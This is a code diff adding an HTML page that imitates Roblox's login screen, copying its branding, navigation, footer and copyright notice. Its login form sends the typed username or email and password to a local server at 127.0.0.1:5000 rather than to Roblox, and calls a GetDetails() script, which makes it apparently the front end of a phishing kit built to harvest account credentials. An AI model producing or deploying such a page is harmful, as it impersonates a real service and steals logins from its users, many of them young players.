@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Roblox</title>
+        <link rel="icon" href="/static/Roblox-Icon.png">
+        <link rel="stylesheet" href="/static/roblox.css">
+    </head>
+    <body>
+        <div class="header-div" style="display: flex; flex-direction: row;">
+            <a class="icon-logo" href="https://www.roblox.com/Login"> Roblox </a>
+            <a class="header-link" href="https://www.roblox.com/discover#/"> Discover</a>
+            <a class="header-link" href="https://www.roblox.com/catalog?Category=1&salesTypeFilter=1"> Avatar Shop</a>
+            <a class="header-link" href="https://www.roblox.com/create"> Create</a>
+            <a class="header-link" href="https://www.roblox.com/upgrades/robux?ctx-nav"> Robux</a>
+            <div class="input-group">
+                <!--<button class="search-icon"></button>-->
+                <input class="input-bar" type="text" placeholder="Search">
+            </div>
+            <a class="sign-up" href="https://www.roblox.com/?returnUrl=https%3A%2F%2Fwww.roblox.com%2FLogin">Sign Up</a>
+        </div>
+        <br>
+        <div class="login-div">
+            <h1 class="login-title">Login to Roblox</h1>
+            <form action="http://127.0.0.1:5000/" method="post" id="details-form">
+                <input class="login-email" id="login-email" name="email" type="text" placeholder="Username/Email/Phone" required>
+                <input class="login-password" id="login-password" name="password" type="password" placeholder="Password" required>
+                <button class="login-button" onclick="GetDetails()" type="submit">Log In</button>
+                <a class="forgot-password" href="https://www.roblox.com/home">Forgot Password or Username?</a>
+            </form>
+        </div>
+        <div class="footer-div"> 
+            <a class="footer-link" href="https://corp.roblox.com/">About Us</a>
+            <a class="footer-link" href="https://careers.roblox.com/">Jobs</a>
+            <a class="footer-link" href="https://blog.roblox.com/">Blog</a>
+            <a class="footer-link" href="https://corporate.roblox.com/parents/">Parents</a>
+            <a class="footer-link" href="https://www.roblox.com/giftcards?location=uk">Gift Cards</a>
+            <a class="footer-link" href="https://en.help.roblox.com/hc/en-us">Help</a>
+            <a class="footer-link" href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use">Terms</a>
+            <a class="footer-link" href="https://en.help.roblox.com/hc/en-us/articles/360059080071">Accessibility</a>
+            <a class="footer-link" href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-">Privacy</a>
+            <a class="footer-link" href="">Cookie Options</a>
+        </div>
+        <hr class="footer-hr">
+        <p class="footer-info">©2023 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+        <script src="/static/roblox.js"></script>
+    </body>
+</html>
